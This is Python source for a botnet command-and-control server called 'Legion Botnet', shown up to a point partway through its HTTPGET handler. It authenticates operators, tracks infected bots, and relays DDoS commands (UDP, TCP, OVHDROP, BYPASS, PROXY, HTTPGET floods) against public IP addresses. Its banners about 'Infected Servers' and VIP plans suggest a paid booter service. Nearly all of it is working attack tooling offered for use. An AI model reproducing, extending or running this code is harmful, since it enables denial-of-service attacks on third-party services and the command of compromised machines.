import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

bots = {}
ansi_clear = '\033[2J\033[H'

banner = f'''     
{Fore.LIGHTMAGENTA_EX}                            ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔
{Fore.LIGHTMAGENTA_EX}                            ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║
{Fore.LIGHTMAGENTA_EX}                            ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝
{Fore.LIGHTWHITE_EX}                   ═══╦════════════════════════════════╦════
{Fore.LIGHTMAGENTA_EX}                 ═════╩════════════════════════════════╩══════
{Fore.LIGHTWHITE_EX}                 ║ {Fore.LIGHTWHITE_EX}- - - - {Fore.LIGHTMAGENTA_EX} Welcome to {Fore.LIGHTRED_EX}Legion {Fore.LIGHTMAGENTA_EX}Botnet {Fore.LIGHTWHITE_EX}- - - -
{Fore.LIGHTWHITE_EX}                 ║     {Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX} Powerfull L4 / L7 + Bypasses. {Fore.LIGHTMAGENTA_EX}⚡
{Fore.LIGHTMAGENTA_EX}                 ═══{Fore.LIGHTWHITE_EX}═══╦══════════════════════════════╦═══{Fore.LIGHTMAGENTA_EX}════ 
{Fore.LIGHTMAGENTA_EX}                  ═════╩══════════════════════════════╩══════
{Fore.LIGHTWHITE_EX}                  ║ {Fore.LIGHTWHITE_EX}- - - Type {Fore.LIGHTMAGENTA_EX}[help] {Fore.LIGHTWHITE_EX}for all commands{Fore.LIGHTWHITE_EX} - - -
{Fore.LIGHTMAGENTA_EX}                  ═══════════════════════════════════════════              
'''

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 120000

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 120000

def find_login(username, password):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;Legion | Infected Servers: [ {len(bots)} ] - User: [ {username} ]\a', False)
            time.sleep(2)
        except:
            client.close()
            
def command_line(client):
    for x in banner.split('\n'):
        send(client, x, )

    prompt = f'{Fore.LIGHTMAGENTA_EX}│LEGION│{Fore.LIGHTWHITE_EX}► '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue
            args = data.split(' ')
            command = args[0].upper()
                
            if command == 'HELP':
                send(client, ansi_clear, False)
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                time.sleep(5)
                send(client, ansi_clear, False)
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] METHODS › [all methods]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] LOGOUT  › [logout botnet]')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] OVHDROP › [host port time]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] UDP     › [host port time]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] TCP     › [host port time]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] BYPASS  › [host port time]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] PROXY   › [host time]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] HTTPGET › [host time]')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                      
            if command == 'METHODS':
                send(client, ansi_clear, False)
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                time.sleep(5)
                send(client, ansi_clear, False)
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] OVHDROP L4 › [.ovhdrop]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] UDP     L4 › [.udp]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] TCP     L4 › [.tcp]')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] BYPASS  L7 › [.pypass]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] PROXY   L7 › [.proxy]')
                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] HTTPGET L7 › [.httpget]')
                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                send(client, Fore.LIGHTMAGENTA_EX + f'')
                

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Logout | Legion Botnet')
                time.sleep(1)
                break
                
            elif command == '.BYPASS':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[{(port)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[BYPASS]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)
         
            elif command == '.OVHDROP':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[{(port)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[OVHDROP]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)
                    
            elif command == '.TCP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                          if validate_time(secs):
                            if validate_size(size):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[{(port)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[TCP]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)

            elif command == '.UDP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port, True):
                          if validate_time(secs):
                            if validate_size(size):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)                                
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[{(port)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[UDP]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)

            elif command == '.PROXY':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                           <__________\______)\__)')              
                                time.sleep(5)
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╦   ╔═╗ ╔═╗{Fore.LIGHTWHITE_EX} ╦ ╔═╗ ╔╗╔')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ║   ║╣  ║ ╦{Fore.LIGHTWHITE_EX} ║ ║ ║ ║║║')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ╩═╝ ╚═╝ ╚═╝{Fore.LIGHTWHITE_EX} ╩ ╚═╝ ╝╚╝')
                                send(client, Fore.LIGHTWHITE_EX + f'                   ═══╦════════════════════════════════╦════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════╩════════════════════════════════╩══════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Target › {Fore.LIGHTRED_EX}[{(ip)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Port   › {Fore.LIGHTRED_EX}[443]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Time   › {Fore.LIGHTRED_EX}[{(secs)}]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Method › {Fore.LIGHTRED_EX}[PROXY]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Author › {Fore.LIGHTBLUE_EX}[m1lan27]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] Plan   › {Fore.LIGHTMAGENTA_EX}[Ultra]')
                                send(client, Fore.LIGHTWHITE_EX + f'                 ║ [{Fore.LIGHTMAGENTA_EX}⚡{Fore.LIGHTWHITE_EX}] VIP    › {Fore.LIGHTGREEN_EX}[True]')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                 ═════════════════════════════════════════════')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                broadcast(data)
                                
            elif command == '.HTTPGET':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                                send(client, ansi_clear, False)
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                                .')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                               / V\ ')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                             / `  /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            <<   |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                            /    |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                          /      |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                        /        |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                      /    \  \ /')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                                     (      ) | |')
                                send(client, Fore.LIGHTMAGENTA_EX + f'                             ________|   _/_  | |')
